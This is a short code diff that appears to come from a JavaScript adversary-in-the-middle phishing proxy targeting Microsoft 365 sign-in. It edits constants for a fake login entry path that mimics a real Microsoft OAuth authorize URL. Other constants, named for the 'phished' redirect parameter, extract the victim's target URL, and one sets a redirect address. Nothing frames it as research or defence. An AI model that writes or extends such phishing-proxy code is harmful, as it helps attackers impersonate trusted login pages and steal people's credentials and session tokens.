@@ -398,7 +398,7 @@ const WebSocket = require('ws');
 // 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED: ALL DEFINED IN CORRECT ORDER)
 // ================================================
 
-const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code%20id_token&scope=openid%20profile%20https://www.office.com/v2/OfficeHome.All&response_mode=form_post&nonce=639184942777869683.NDBjMWJiZWYtMTZlYi00ZGU4LTk5MGYtMzg5YTY0NDFjZjZiYmQ3Y2RhYjMtMmQ4OC00YmQyLWFmNmMtMjA1ZmEwN2ExZjc5&ui_locales=en-US&mkt=en-US&client-request-id=b73d4760-8726-436d-9059-2a10aebcb8c4&state=gwsL35uLWOZvy4liF5-j70k8HHOZWgbBfF32y2cQkfrdIllrA9f5uu_eT0-ESGxQEup1zHXhzYVORumtFyFKxx1-gmozntqwCKqPFPEFCuY8rQe06UE9tLWu5Lqs93FefpQSsTprEGSXl7rRoNJ0qVvmyuZVE1tHYvh5uNIZrtrdeJwWTd1qXszoKZQcTJYymi6Gz70Dyi2zwC-LfavRODIebK3eEHdelBY2eaKErWHT3oWHy8vdRHOAUI3XrfoQP2Pc1O6ywOOQmMiIJbwJ4YpkWDOhYyurgNqzzZBq-t0VHpGpYSiv930kwwb_gJcxW4ZCyqr95-TttIa2O3o0WuAjP-GFZRpZmB6eLBdK0fYQLYSiGBVApR7LJwJWEHT0OAiLVURduPJu3gxuR8RjeZHa5_Xy-OO6xhKpHWIafNE&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0";
+const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
